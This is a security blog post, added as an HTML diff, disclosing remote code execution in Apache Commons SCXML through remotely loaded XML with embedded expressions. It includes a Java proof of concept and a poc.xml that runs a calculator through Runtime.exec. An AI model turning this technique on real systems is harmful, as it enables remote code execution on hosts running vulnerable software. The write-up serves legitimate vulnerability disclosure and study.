@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01 Preface What is Apache Commons SCXML?   Here is the Apache offical explanation. State Chart XML (SCXML) is currently a Working Draft specification published by the World Wide Web Consortium (W3C)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Commons SCXML Remote Code Execution">
+<meta property="og:url" content="https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/index.html">
+<meta property="og:site_name">
+<meta property="og:description" content="0x01 Preface What is Apache Commons SCXML?   Here is the Apache offical explanation. State Chart XML (SCXML) is currently a Working Draft specification published by the World Wide Web Consortium (W3C)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-241.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-253.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-244.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-255.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-245.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-256.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-246.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-247.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-248.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-249.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-237.png">
+<meta property="article:published_time" content="2023-02-06T09:18:00.000Z">
+<meta property="article:modified_time" content="2023-10-09T03:34:07.176Z">
+<meta property="article:author" content="pyn3rd">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pyn3rd.github.io/images/pasted-241.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Apache Commons SCXML Remote Code Execution</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archives</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/09/15/CVE-2023-34040-Spring-Kafka-Deserialization-Remote-Code-Execution/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/11/15/A-New-Way-of-Jolokia-Remote-Code-Execution/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&text=Apache Commons SCXML Remote Code Execution"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&title=Apache Commons SCXML Remote Code Execution"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&is_video=false&description=Apache Commons SCXML Remote Code Execution"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Apache Commons SCXML Remote Code Execution&body=Check out this article: https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&title=Apache Commons SCXML Remote Code Execution"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&title=Apache Commons SCXML Remote Code Execution"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&title=Apache Commons SCXML Remote Code Execution"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&title=Apache Commons SCXML Remote Code Execution"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&name=Apache Commons SCXML Remote Code Execution&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&t=Apache Commons SCXML Remote Code Execution"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-Preface"><span class="toc-number">1.</span> <span class="toc-text">0x01 Preface</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-How-to-find-it"><span class="toc-number">2.</span> <span class="toc-text">0x02 How to find it</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x03-Proof-of-Concept"><span class="toc-number">3.</span> <span class="toc-text">0x03 Proof of Concept</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Apache Commons SCXML Remote Code Execution
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">by pyn3rd</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-02-06T09:18:00.000Z" itemprop="datePublished">2023-02-06</time>
+        
+        (Updated: <time datetime="2023-10-09T03:34:07.176Z" itemprop="dateModified">2023-10-09</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h5 id="0x01-Preface"><a href="#0x01-Preface" class="headerlink" title="0x01 Preface"></a>0x01 Preface</h5><ul>
+<li>What is Apache Commons SCXML? </li>
+</ul>
+<p>Here is the Apache offical explanation.</p>
+<p>State Chart XML (SCXML) is currently a Working Draft specification published by the World Wide Web Consortium (W3C). SCXML provides a generic state-machine based execution environment based on Harel State Tables. SCXML is a candidate for the control language within multiple markup languages coming out of the W3C (see the latest Working Draft for details). Commons SCXML is an implementation aimed at creating and maintaining a Java SCXML engine capable of executing a state machine defined using a SCXML document, while abstracting out the environment interfaces.</p>
+<h5 id="0x02-How-to-find-it"><a href="#0x02-How-to-find-it" class="headerlink" title="0x02 How to find it"></a>0x02 How to find it</h5><p>When I audited the source code, I unintentionally found out a sensitive class named <code>SCXMLReader</code>.</p>
+<p><img src="/images/pasted-241.png" alt="upload successful"></p>
+<p>Then I kept on analysing the critical class <code>SCXMLReader</code>. The class consisted of serveral static methods, one of them named <code>read</code>, it could load a XML file by the parameter <code>scxmlPath</code>. However, the method did not verify the legal resource of the XML file, in the other words, it could load a XML file from any untrustworthy resource.</p>
+<p><img src="/images/pasted-253.png" alt="upload successful"></p>
+<p>Next, I stepped into the <code>readInternal</code> method, it tried to resovle the URL of the XML file.</p>
+<p><img src="/images/pasted-244.png" alt="upload successful"></p>
+<p>Obviously, it did not restrict the loading resource, and a remote resource can also be initialized.<br><img src="/images/pasted-255.png" alt="upload successful"></p>
+<p>Then, I stepped into the <code>getReader</code> method, it tried to load the XML stream as input.<br><img src="/images/pasted-245.png" alt="upload successful"></p>
+<p>If there is a URL as file path, the input stream will obtain from the URL resource.<br><img src="/images/pasted-256.png" alt="upload successful"></p>
+<p>The XML stream will be returned finally.<br><img src="/images/pasted-246.png" alt="upload successful"></p>
+<p>Next, I definitely should utilize some method to handle with the XML stream, here I convinced myself the method called <code>setStateMachine</code> was what I needed.<br><img src="/images/pasted-247.png" alt="upload successful"></p>
+<p>Then I stepped into the method. We can see the initialization of the instance.<br><img src="/images/pasted-248.png" alt="upload successful"></p>
+<p>At last, the instance was intialized and the Java Expression Lauguage in XML file was be executed by <code>getEvaluator</code> method.<br><img src="/images/pasted-249.png" alt="upload successful"></p>
+<h5 id="0x03-Proof-of-Concept"><a href="#0x03-Proof-of-Concept" class="headerlink" title="0x03 Proof of Concept"></a>0x03 Proof of Concept</h5><p>By convention, I eventually demostrate it with the explicit PoC.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line">import org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line">import org.apache.commons.scxml2.model.ModelException;</span><br><span class="line">import org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line">import javax.xml.stream.XMLStreamException;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class SCXMLDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws ModelException, XMLStreamException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        // engine to execute the scxml instance</span><br><span class="line">        SCXMLExecutor executor = new SCXMLExecutor();</span><br><span class="line">        // parse SCXML URL into SCXML model</span><br><span class="line">        SCXML scxml = SCXMLReader.read(&quot;http://127.0.0.1:8000/poc.xml&quot;);</span><br><span class="line"></span><br><span class="line">        // set state machine (scxml instance) to execute</span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>poc.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;</span><br><span class="line">&lt;state id=&quot;run&quot;&gt;</span><br><span class="line">&lt;onentry&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;open -a calculator&#x27;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/onentry&gt;</span><br><span class="line">&lt;/state&gt;</span><br><span class="line">&lt;/scxml&gt;</span><br></pre></td></tr></table></figure>
+
+<p>The screenshot of this illustration.<br><img src="/images/pasted-237.png" alt="upload successful"></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-Preface"><span class="toc-number">1.</span> <span class="toc-text">0x01 Preface</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-How-to-find-it"><span class="toc-number">2.</span> <span class="toc-text">0x02 How to find it</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x03-Proof-of-Concept"><span class="toc-number">3.</span> <span class="toc-text">0x03 Proof of Concept</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&text=Apache Commons SCXML Remote Code Execution"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&title=Apache Commons SCXML Remote Code Execution"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&is_video=false&description=Apache Commons SCXML Remote Code Execution"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Apache Commons SCXML Remote Code Execution&body=Check out this article: https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&title=Apache Commons SCXML Remote Code Execution"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&title=Apache Commons SCXML Remote Code Execution"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&title=Apache Commons SCXML Remote Code Execution"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&title=Apache Commons SCXML Remote Code Execution"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&name=Apache Commons SCXML Remote Code Execution&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/&t=Apache Commons SCXML Remote Code Execution"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2016-2024
+        pyn3rd
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">Home</a></li><!--
+        --><!--
+          --><li><a href="/archives/">Archives</a></li><!--
+        --><!--
+          --><li><a href="/search/">Search</a></li><!--
+        --><!--
+          --><li><a href="/about/">About</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <span id="busuanzi_container_site_pv">
+                  Views <span id="busuanzi_value_site_pv"></span>
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                  Visitors <span id="busuanzi_value_site_uv"></span>
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'pyn3rd/pyn3rd.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
